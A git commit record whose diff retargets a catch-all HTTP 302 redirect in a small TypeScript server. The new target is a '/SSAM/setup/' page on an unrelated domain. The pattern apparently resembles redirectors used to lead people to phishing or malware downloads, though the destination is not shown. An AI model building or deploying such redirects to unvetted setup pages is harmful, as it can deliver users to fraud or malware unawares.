2ec51b85d9de2dc7edabfcac670a6aead9bb875d
Digital2025001 <bosmichael30@gmail.com>
2025-10-01 16:19:11 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://betterwebplace.com/", // Replace this with your actual link
+      Location: "https://mecamex.net/SSAM/setup/", // Replace this with your actual link
     },
   });
 });
